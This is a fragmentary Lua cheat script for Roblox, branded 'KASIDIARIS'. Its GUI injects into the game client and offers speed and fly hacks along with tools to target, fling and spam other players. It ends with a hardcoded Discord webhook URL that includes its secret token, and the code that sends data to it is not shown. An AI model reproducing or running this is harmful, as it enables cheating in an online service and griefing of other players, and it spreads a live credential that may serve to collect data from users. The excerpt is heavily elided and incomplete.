...
if game.CoreGui:FindFirstChild("SysBroker") then
	game:GetService("StarterGui"):SetCore("SendNotification", {Title = "KASIDIARIS",Text = "GUI Already loaded, rejoin to re-execute",Duration = 5;})
	return
end
local version = 2
--VARIABLES
...
TitleBarLabel.Text = "____/KASIDIARIS\\___"
...
local function UpdateTarget(player)
	pcall(function()
		if table.find(ForceWhitelist,player.UserId) then
			SendNotify("KASIDIARIS","You cant target this player: @"..player.Name.." / "..player.DisplayName,5)
			player = nil
		end
	end)
	if (player ~= nil) then
...
CMDBar.FocusLost:Connect(function()
	...
	SendNotify("KASIDIARIS",("Executed "..command),5)
	CMDBar.Text = ""
end)
...
WalkSpeed_Button.MouseButton1Click:Connect(function()
	pcall(function()
		...
		SendNotify("KASIDIARIS","Walk speed updated.",5)
	end)
end)
...
JumpPower_Button.MouseButton1Click:Connect(function()
	pcall(function()
		...
		SendNotify("KASIDIARIS","Jump power updated.",5)
	end)
end)
...
FlySpeed_Button.MouseButton1Click:Connect(function()
	pcall(function()
		...
		SendNotify("KASIDIARIS","Fly speed updated.",5)
	end)
end)
...
SaveCheckpoint_Button.MouseButton1Click:Connect(function()
	...
	SendNotify("KASIDIARIS","Checkpoint saved.",5)
end)

ClearCheckpoint_Button.MouseButton1Click:Connect(function()
	SavedCheckpoint = nil
	SendNotify("KASIDIARIS","Checkpoint cleared.",5)
end)
...
WhitelistTarget_Button.MouseButton1Click:Connect(function()
	if TargetedPlayer ~= nil then
		if table.find(ScriptWhitelist, Players[TargetedPlayer].UserId) then
			...
			SendNotify("KASIDIARIS",TargetedPlayer.." removed from whitelist.",5)
		else
			table.insert(ScriptWhitelist, Players[TargetedPlayer].UserId)
			SendNotify("KASIDIARIS",TargetedPlayer.." added to whitelist.", 5)
		end
	end
end)
...
Day_Button.MouseButton1Click:Connect(function()
	if Shaders_Button.Ticket_Asset.ImageColor3 == Color3.fromRGB(255,0,0) then
		...
		SendNotify("KASIDIARIS","Please turn off shaders.",5)
	end
end)
...
FreeEmotes_Button.MouseButton1Click:Connect(function()
	if not FreeEmotesEnabled then
		...
		SendNotify("KASIDIARIS","Loading free emotes.\nCredits: Gi#7331")
...
Players.PlayerRemoving:Connect(function(player)
	pcall(function()
		if player.Name == TargetedPlayer then
			UpdateTarget(nil)
			SendNotify("KASIDIARIS","Targeted player left/rejoined.",5)
		end
	end)
end)
...
plr.CharacterAdded:Connect(function(x)
	...
	if PotionDi_Button.Ticket_Asset.ImageColor3 == Color3.fromRGB(0,255,0) then
		ChangeToggleColor(PotionDi_Button)
		SendNotify("KASIDIARIS","PotionDick was automatically disabled due to your character respawn",5)
	end
	if PotionFling_Button.Ticket_Asset.ImageColor3 == Color3.fromRGB(0,255,0) then
		ChangeToggleColor(PotionFling_Button)
		SendNotify("KASIDIARIS","PotionFling was automatically disabled due to your character respawn",5)
	end
	if AntiRagdoll_Button.Ticket_Asset.ImageColor3 == Color3.fromRGB(0,255,0) then
		ChangeToggleColor(AntiRagdoll_Button)
		SendNotify("KASIDIARIS","AntiRagdoll was automatically disabled due to your character respawn",5)
	end
	if SpamMines_Button.Ticket_Asset.ImageColor3 == Color3.fromRGB(0,255,0) then
		ChangeToggleColor(SpamMines_Button)
		SendNotify("KASIDIARIS","SpamMines was automatically disabled due to your character respawn",5)
	end
	if Fly_Button.Ticket_Asset.ImageColor3 == Color3.fromRGB(0,255,0) then
		ChangeToggleColor(Fly_Button)
		flying = false
		...
		KeyDownFunction:Disconnect()
		KeyUpFunction:Disconnect()
		SendNotify("KASIDIARIS","Fly was automatically disabled due to your character respawn",5)
	end
	...
	if ammount == original_ammount then
		...
		if not (count == original_ammount) then
			SysBroker:Destroy()
			SendNotify("KASIDIARIS","An unexpected error occurred, re-joining...")
			game:GetService("TeleportService"):TeleportToPlaceInstance(game.PlaceId, game.JobId, plr)
		end
	else
		SysBroker:Destroy()
...
local webhookUrl = "https://discord.com/api/webhooks/1503116956570484877/lJ8Z8MNdvYFBgDkesrpDjTUAqMEzNnveOpUTgMAfrrwJRAkaLztCSZKd5yzjXPVKELZz"
